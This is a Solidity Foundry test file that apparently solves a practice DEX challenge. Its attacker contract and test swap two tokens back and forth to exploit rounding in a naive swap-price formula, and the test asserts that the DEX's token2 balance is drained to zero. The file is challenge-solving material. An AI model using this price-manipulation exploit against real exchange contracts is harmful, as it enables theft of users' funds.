// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/Contract.sol";

contract Victim {
    function getSwapPrice(uint256 bal1, uint256 bal2, uint256 amount) public view returns(uint){
        return (amount * bal1)/bal2;
    }
}

contract SwappableToken is ERC20 {
  address private _dex;
  constructor(address dexInstance, string memory name, string memory symbol, uint256 initialSupply) public ERC20(name, symbol) {
        _mint(msg.sender, initialSupply);
        _dex = dexInstance;
  }

  function approve(address owner, address spender, uint256 amount) public returns(bool){
    require(owner != _dex, "InvalidApprover");
    super._approve(owner, spender, amount);
  }
}


interface IDex {
  function token1() external view returns (address);
  function token2() external view returns (address);
  function swap(address from, address to, uint amount) external;
  function approve(address spender, uint amount) external;
}

contract DexAttacker {

  IDex public dex;
  IERC20 public token1;
  IERC20 public token2;
  
  constructor(address dexAddr) {
    dex = IDex(dexAddr);
    token1 = IERC20(dex.token1());
    token2 = IERC20(dex.token2());
  }

  function fire() internal {
      require(token1.balanceOf(address(this)) == 10, "I need some tokens!!!");
      require(token2.balanceOf(address(this)) == 10, "I need some tokens!!!");
      token1.transfer(address(dex), 10);
      for (uint i = 0; i < 11; i++) {
        if (i % 2 == 0) {
            uint orig = token2.balanceOf(address(this));
            token2.approve(address(dex), orig);
            dex.swap(address(token2), address(token1), orig);
        }
        else {
            uint orig = token1.balanceOf(address(this));
            token1.approve(address(dex), orig);
            dex.swap(address(token1), address(token2), orig);
        }            
      }
      token1.approve(address(dex), 76);
      dex.swap(address(token1), address(token2), 34);
    }
}

contract ExploitTest is Test {

    DexAttacker public attacker;
    SwappableToken token1;
    SwappableToken token2;
    DexTwo public dex;
    address public eoaAddress;

    function setUp() public {
        eoaAddress = 0x15cB768EBC5A5E7524fdDc3A2d5db7512767bD53;
        dex = new DexTwo();
        token1 = new SwappableToken(address(dex), "tok1", "T1", 110);
        token2 = new SwappableToken(address(dex), "tok2", "T2", 110);
        dex.setTokens(address(token1), address(token2));
        token1.transfer(eoaAddress, 10);
        token2.transfer(eoaAddress, 10);
        token1.transfer(address(dex), 100);
        token2.transfer(address(dex), 100);
    }

    function testExploit() public {
        vm.startPrank(eoaAddress);
        token1.transfer(address(dex), 10);

        for (uint i = 0; i < 11; i++) {
            if (i % 2 == 0) {
                uint orig = token2.balanceOf(eoaAddress);
                token2.approve(address(dex), orig);
                dex.swap(address(token2), address(token1), orig);
            }
            else {
                uint orig = token1.balanceOf(eoaAddress);
                token1.approve(address(dex), orig);
                dex.swap(address(token1), address(token2), orig);
            }            
        }
        assertEq(token1.balanceOf(eoaAddress), 76);
        token1.approve(address(dex), 76);
        //assertEq(dex.getSwapPrice(address(token1), address(token2), 34), 110);
        dex.swap(address(token1), address(token2), 34);
        assertEq(token2.balanceOf(address(dex)), 0);
    }
}